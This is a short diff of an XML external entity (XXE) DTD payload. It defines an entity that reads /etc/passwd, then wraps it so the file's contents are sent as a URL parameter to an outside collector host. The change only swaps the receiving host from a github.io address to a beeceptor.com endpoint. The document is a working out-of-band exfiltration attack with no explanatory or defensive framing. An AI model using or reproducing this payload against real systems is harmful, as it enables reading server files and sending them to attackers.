@@ -1,3 +1,3 @@
 <!ENTITY % passwd SYSTEM "file:///etc/passwd">
-<!ENTITY % wrapper "<!ENTITY send SYSTEM 'https://amerkun.github.io/dtd/?%passwd;'>">
-<!ENTITY send SYSTEM 'https://amerkun.github.io/dtd/?CONTENTS_OF_PASSWD'>
+<!ENTITY % wrapper "<!ENTITY send SYSTEM 'https://ikkang.free.beeceptor.com/?%passwd;'>">
+<!ENTITY send SYSTEM 'https://ikkang.free.beeceptor.com/dtd/?CONTENTS_OF_PASSWD'>
